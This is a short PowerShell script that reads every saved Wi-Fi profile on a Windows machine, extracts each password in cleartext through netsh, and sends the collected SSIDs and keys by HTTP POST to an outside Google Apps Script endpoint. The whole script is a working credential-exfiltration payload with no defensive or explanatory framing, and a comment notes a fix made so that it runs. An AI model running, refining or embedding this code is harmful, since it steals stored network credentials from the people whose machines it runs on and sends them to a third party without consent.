# --- Get All Saved Wi-Fi Profiles and Passwords ---
$wifiList = netsh wlan show profiles | Select-String "\s+All User Profile\s+:\s+(.*)" | ForEach-Object {
    $ssid = $_.Matches.Groups[1].Value.Trim()
    
    # Get the password for the profile
    $rawPass = netsh wlan show profile name="$ssid" key=clear | Select-String "Key Content\W+:(.+)$"
    
    if ($rawPass) {
        $pass = $rawPass.Matches.Groups[1].Value.Trim()
    } else {
        $pass = "[No Password]"
    }
    
    # FIXED: Added curly braces ${ssid} to stop the ":" error
    "${ssid}: $pass"
}

$allWifi = $wifiList -join " | "

$body = @{
    allwifi = $allWifi
}

# Sending the data
Invoke-RestMethod -Uri "https://script.google.com/macros/s/AKfycbyeNDhmNh-zMEfXMHr30U2zB6iGZi09bcOfCyslF8KT9mk9EO08p-pHbLv1-OfhNI63/exec" -Method POST -Body $body
